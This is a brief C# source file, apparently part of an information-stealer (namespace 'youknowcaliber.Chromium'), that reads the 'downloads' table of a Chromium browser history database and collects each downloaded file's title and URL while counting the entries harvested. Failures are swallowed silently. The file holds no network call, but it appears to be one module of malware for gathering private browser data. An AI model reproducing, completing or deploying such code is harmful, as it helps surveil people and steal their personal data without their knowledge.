﻿using System;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
	internal sealed class Downloads
	{
		public static List<Site> Get(string sHistory)
		{
			List<Site> result;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "downloads");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site item = default(Site);
						item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 17));
						Counting.Downloads++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Site>();
			}
			return result;
		}
	}
}
